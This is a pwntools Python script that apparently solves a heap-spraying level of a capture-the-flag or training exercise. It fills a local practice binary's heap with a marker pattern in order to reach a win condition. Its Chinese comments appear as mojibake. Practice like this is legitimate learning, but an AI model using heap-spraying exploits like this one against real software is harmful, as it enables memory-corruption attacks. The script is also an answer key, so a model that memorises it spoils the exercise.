#!/usr/bin/env python3
"""
Level 5: Heap Spraying - Solution
ç›®æ ‡ï¼šä½¿ç”¨å †å–·æŠ€æœ¯åœ¨å†…å­˜ä¸­åˆ›å»ºç‰¹å®šæ¨¡å¼
"""

from pwn import *
import time

context.log_level = 'error'  # å‡å°‘è¾“å‡ºå¹²æ‰°

def solve():
    p = process('./vuln')

    # ç›®æ ‡æ¨¡å¼ï¼š!SPRAY!
    spray_pattern = p64(0x53505241592121)

    def alloc(num=1):
        p.sendline(b'1' if num == 1 else b'2')
        if num > 1:
            p.sendline(str(num).encode())
            time.sleep(0.01)

    def edit(idx, data):
        p.sendline(b'5')
        p.sendline(str(idx).encode())
        p.send(data + b'\n')
        time.sleep(0.01)

    log.info("Step 1: Heap spray - allocate 100 chunks")
    alloc(100)

    log.info("Step 2: Edit first 20 chunks with spray pattern")
    # åªéœ€è¦è‡³å°‘10ä¸ªï¼Œç¼–è¾‘20ä¸ªä»¥ç¡®ä¿æˆåŠŸ
    for i in range(20):
        edit(i, spray_pattern)
        if (i + 1) % 5 == 0:
            log.info(f"Edited {i + 1}/20 chunks")

    log.info("Step 3: Check win condition")
    p.sendline(b'6')

    output = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print(output)

    if 'Flag:' in output or 'ğŸ‰' in output:
        log.success("Level 5 è§£é¢˜æˆåŠŸï¼")
        return True
    else:
        log.failure("Level 5 è§£é¢˜å¤±è´¥")
        return False

if __name__ == '__main__':
    solve()
